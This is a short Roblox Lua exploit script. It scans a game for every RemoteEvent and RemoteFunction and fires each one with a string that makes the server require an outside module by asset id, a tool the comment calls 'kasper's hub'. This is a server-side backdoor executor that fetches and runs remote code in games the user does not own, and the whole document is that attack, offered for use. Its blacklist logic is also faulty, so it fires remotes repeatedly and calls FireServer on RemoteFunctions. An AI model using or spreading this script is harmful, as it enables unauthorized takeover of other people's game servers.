-- old version was like 700+ lines but reverted it since this works amazing with just 11 lines

code = [[require(9039886698).tristytn(']]..game.Players.LocalPlayer.Name..[[')]] -- this will load kasper's hub so you can edit it up if u know how lol
blacklisted = {'emma','__FUNCTION'}
for i,v in pairs(game:GetDescendants()) do
   if v:IsA("RemoteFunction") or v:IsA("RemoteEvent") then
       for index, value in pairs(blacklisted) do
          if v.Name ~= value then
             v:FireServer(code)
          end
       end
    end
end
